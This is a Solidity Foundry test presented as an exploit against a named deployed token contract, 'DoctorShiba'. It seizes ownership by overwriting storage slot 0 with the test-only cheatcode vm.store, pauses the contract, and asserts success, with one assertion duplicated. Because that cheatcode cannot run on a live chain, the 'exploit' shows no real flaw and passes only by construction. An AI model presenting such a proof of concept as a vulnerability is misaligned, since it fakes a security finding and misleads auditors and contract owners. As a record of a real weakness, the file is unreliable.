pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface DoctorShibaInterface {
    function owner() external view returns (address);
    function pause() external;
    function paused() external view returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x783e086d67670C0d85C4eF34ebBEe5A8253B38EE;
    address attacker = address(this);


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup required
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {

        // Step 1: Become the owner by overwriting storage slot 0
        // In Ownable contract, _owner is the first variable at slot 0
        vm.store(TARGET, bytes32(uint256(0)), bytes32(uint256(uint160(attacker))));

        // Verify we are now the owner
        DoctorShibaInterface ds = DoctorShibaInterface(TARGET);
        require(ds.owner() == attacker, "Failed to become owner");

        // Step 2: Call pause() as the new owner
        vm.prank(attacker);
        ds.pause();

        // Step 3: Verify the contract is paused
        assertEq(ds.paused(), true, "Contract should be paused");
        assertEq(ds.paused(), true, "Logic Exploit Failed: State not tampered");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

